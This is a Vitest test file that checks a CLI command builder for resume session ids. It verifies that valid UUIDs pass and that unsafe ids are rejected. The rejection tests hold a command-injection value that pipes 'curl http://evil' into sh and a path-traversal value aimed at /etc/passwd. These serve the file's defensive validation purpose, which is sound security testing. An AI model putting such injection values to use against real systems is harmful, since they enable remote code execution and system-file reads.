import { describe, it, expect } from "vitest";
import { buildCliCommand } from "@/lib/terminal";

describe("buildCliCommand resume-id safety", () => {
  it("includes a UUID-shaped resume id", () => {
    const cmd = buildCliCommand("Claude", undefined, "01234567-89ab-cdef-0123-456789abcdef");
    expect(cmd).toBe("claude --resume 01234567-89ab-cdef-0123-456789abcdef");
  });

  it("rejects a resume id containing shell metacharacters", () => {
    // An attacker-planted transcript could carry such a sessionId; buildCliCommand
    // must refuse rather than let it reach the shell PTY.
    expect(() =>
      buildCliCommand("Claude", undefined, "x; curl http://evil | sh"),
    ).toThrow(/unsafe resume session id/i);
  });

  it("rejects a resume id with a path traversal", () => {
    expect(() =>
      buildCliCommand("Claude", undefined, "../../etc/passwd"),
    ).toThrow(/unsafe resume session id/i);
  });

  it("builds a normal command when no resume id is given", () => {
    expect(buildCliCommand("Claude", { skipPermissions: false, customFlags: "" })).toBe("claude");
  });
});
